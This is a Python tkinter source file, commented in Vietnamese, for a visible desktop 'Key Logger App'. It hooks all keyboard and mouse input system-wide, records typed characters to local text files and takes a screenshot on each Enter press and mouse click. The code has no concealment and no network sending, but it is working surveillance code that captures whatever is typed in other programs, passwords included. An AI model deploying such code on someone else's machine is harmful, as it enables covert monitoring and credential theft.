import tkinter as tk
from tkinter import ttk, messagebox
import keyboard
import mouse
import pyautogui
import os
from threading import Thread
import datetime

class Utility:
    """Lớp tiện ích hỗ trợ các chức năng chung."""

    @staticmethod
    def initialize_directories(output_path, screenshot_path):
        """Tạo các thư mục cần thiết nếu chưa tồn tại."""
        try:
            os.makedirs(output_path, exist_ok=True)
            os.makedirs(screenshot_path, exist_ok=True)
            print(f"Directories initialized: {screenshot_path}")
        except Exception as e:
            print(f"Error creating directories: {e}")
            raise Exception(f"Failed to initialize directories: {e}")

    @staticmethod
    def get_unique_file_path(base_path, base_name="recorded_keys"):
        """Tạo đường dẫn tệp với tên duy nhất."""
        counter = 1
        while True:
            file_path = os.path.join(base_path, f"{base_name}_{counter}.txt")
            if not os.path.exists(file_path):
                return file_path
            counter += 1

class KeyLoggerApp:
    def __init__(self, root):
        self.root = root
        self.root.title("Key Logger App")
        self.root.geometry("800x600")

        # Đường dẫn lưu trữ
        self.output_path = "D:/code_dao/py/output/"
        self.screenshot_path = os.path.join(self.output_path, "screenshots/")

        # Biến trạng thái
        self.current_text = []
        self.screenshot_count = 1
        self.is_listening = False

        # Khởi tạo thư mục
        try:
            Utility.initialize_directories(self.output_path, self.screenshot_path)
        except Exception as e:
            messagebox.showerror("Error", str(e))
            self.root.destroy()
            return

        # Giao diện
        self.create_widgets()
        self.update_status("Ready")

    def create_widgets(self):
        """Tạo giao diện người dùng."""
        control_frame = ttk.Frame(self.root)
        control_frame.pack(pady=20)

        self.start_button = ttk.Button(control_frame, text="Start Recording", command=self.start_recording)
        self.start_button.grid(row=0, column=0, padx=10)

        self.stop_button = ttk.Button(control_frame, text="Stop Recording", command=self.stop_recording, state=tk.DISABLED)
        self.stop_button.grid(row=0, column=1, padx=10)

        self.status_label = ttk.Label(self.root, text="", anchor="w", relief="sunken")
        self.status_label.pack(fill="x", side="bottom")

    def update_status(self, status):
        """Cập nhật trạng thái giao diện."""
        self.status_label.config(text=f"Status: {status}")

    def save_to_file(self):
        """Lưu văn bản đã gõ vào tệp."""
        file_path = Utility.get_unique_file_path(self.output_path)
        try:
            with open(file_path, "w", encoding="utf-8") as file:
                file.write("".join(self.current_text))
            messagebox.showinfo("Success", f"Recorded keys saved to: {file_path}")
        except Exception as e:
            messagebox.showerror("Error", f"Error saving file: {e}")

    def capture_screenshot(self):
        """Chụp và lưu ảnh màn hình."""
        screenshot_name = f"screenshot_{self.screenshot_count}.png"
        screenshot_path = os.path.join(self.screenshot_path, screenshot_name)
        try:
            pyautogui.screenshot(screenshot_path)
            self.screenshot_count += 1
        except Exception as e:
            print(f"Error capturing screenshot: {e}")

    def handle_keyboard_event(self, event):
        """Xử lý sự kiện bàn phím."""
        if event.event_type == "down":
            key = event.name
            if key == "space":
                self.current_text.append(" ")
            elif key == "enter":
                self.current_text.append("\n")
                self.capture_screenshot()
            elif len(key) == 1:
                self.current_text.append(key)
            else:
                print(f"Special key pressed: {key}")

    def handle_mouse_event(self, event):
        """Xử lý sự kiện chuột."""
        if isinstance(event, mouse.ButtonEvent) and event.event_type == "down":
            self.capture_screenshot()

    def start_listening(self):
        """Bắt đầu lắng nghe sự kiện."""
        keyboard.hook(self.handle_keyboard_event)
        mouse.hook(self.handle_mouse_event)
        self.is_listening = True

    def stop_listening(self):
        """Dừng lắng nghe sự kiện."""
        keyboard.unhook_all()
        mouse.unhook_all()
        self.is_listening = False

    def start_recording(self):
        """Bắt đầu ghi lại sự kiện."""
        self.start_button.config(state=tk.DISABLED)
        self.stop_button.config(state=tk.NORMAL)
        self.update_status("Recording...")
        self.current_text = []
        self.screenshot_count = 1

        thread = Thread(target=self.start_listening)
        thread.start()

    def stop_recording(self):
        """Dừng ghi lại sự kiện."""
        self.start_button.config(state=tk.NORMAL)
        self.stop_button.config(state=tk.DISABLED)
        self.update_status("Stopped")
        self.stop_listening()
        self.save_to_file()

if __name__ == "__main__":
    root = tk.Tk()
    app = KeyLoggerApp(root)
    root.mainloop()
